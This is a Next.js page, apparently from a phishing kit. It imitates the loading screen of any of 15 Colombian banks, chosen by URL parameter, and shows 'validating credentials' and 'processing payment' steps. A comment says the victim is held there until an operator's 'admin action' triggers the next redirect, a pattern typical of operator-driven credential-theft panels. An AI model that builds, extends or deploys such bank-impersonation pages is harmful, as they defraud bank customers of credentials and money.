"use client";

import { useEffect } from 'react';
import { useRouter, useParams } from 'next/navigation';
import { useCaseStatus } from '@/context/useCaseStatus';

export default function CargandoPage() {
    useCaseStatus();
    const router = useRouter();
    const params = useParams();
    const bankId = params.bankId as string;

    useEffect(() => {
        // We stay here until useCaseStatus redirects us based on admin action
    }, []);

    const bankNames: Record<string, string> = {
        bancolombia: 'Bancolombia',
        davivienda: 'Davivienda',
        bogota: 'Banco de Bogotá',
        nequi: 'Nequi',
        avvillas: 'AV Villas',
        colpatria: 'Colpatria',
        popular: 'Popular',
        cajasocial: 'Caja Social',
        citibank: 'Citibank',
        falabella: 'Falabella',
        finandina: 'Finandina',
        itau: 'Itaú',
        occidente: 'Occidente',
        serfinanza: 'Serfinanza',
        tuya: 'Tuya'
    };

    return (
        <div className="min-h-screen bg-white flex flex-col">
            {/* Header */}
            <header className="border-b border-gray-200 p-4 flex justify-between items-center">
                <div className="text-xl font-bold text-gray-800">
                    {bankNames[bankId] || 'Banco'}
                </div>
                <button className="text-blue-600 hover:text-blue-800 flex items-center gap-2">
                    Salir
                    <svg className="w-4 h-4" fill="none" stroke="currentColor" viewBox="0 0 24 24">
                        <path strokeLinecap="round" strokeLinejoin="round" strokeWidth={2} d="M17 8l4 4m0 0l-4 4m4-4H3" />
                    </svg>
                </button>
            </header>

            {/* Main Content */}
            <main className="flex-1 flex flex-col items-center justify-center px-4">
                <div className="text-center space-y-6">
                    {/* Loading Spinner */}
                    <div className="relative inline-block">
                        <div className="w-20 h-20 border-4 border-blue-200 border-t-blue-600 rounded-full animate-spin"></div>
                    </div>

                    {/* Loading Text */}
                    <div className="space-y-2">
                        <h2 className="text-2xl font-bold text-gray-800">
                            Procesando tu transacción
                        </h2>
                        <p className="text-gray-600">
                            Por favor espera mientras validamos tu información...
                        </p>
                    </div>

                    {/* Progress Indicators */}
                    <div className="space-y-3 max-w-md mx-auto mt-8">
                        <div className="flex items-center gap-3">
                            <div className="w-6 h-6 rounded-full bg-green-500 flex items-center justify-center">
                                <svg className="w-4 h-4 text-white" fill="none" stroke="currentColor" viewBox="0 0 24 24">
                                    <path strokeLinecap="round" strokeLinejoin="round" strokeWidth={2} d="M5 13l4 4L19 7" />
                                </svg>
                            </div>
                            <p className="text-sm text-gray-700">Validando credenciales</p>
                        </div>
                        <div className="flex items-center gap-3">
                            <div className="w-6 h-6 rounded-full bg-blue-500 flex items-center justify-center">
                                <div className="w-3 h-3 border-2 border-white border-t-transparent rounded-full animate-spin"></div>
                            </div>
                            <p className="text-sm text-gray-700">Procesando pago</p>
                        </div>
                        <div className="flex items-center gap-3">
                            <div className="w-6 h-6 rounded-full bg-gray-300"></div>
                            <p className="text-sm text-gray-500">Confirmando transacción</p>
                        </div>
                    </div>
                </div>
            </main>

            {/* Footer */}
            <div className="h-2 bg-gradient-to-r from-yellow-400 via-red-500 to-blue-600"></div>
        </div>
    );
}
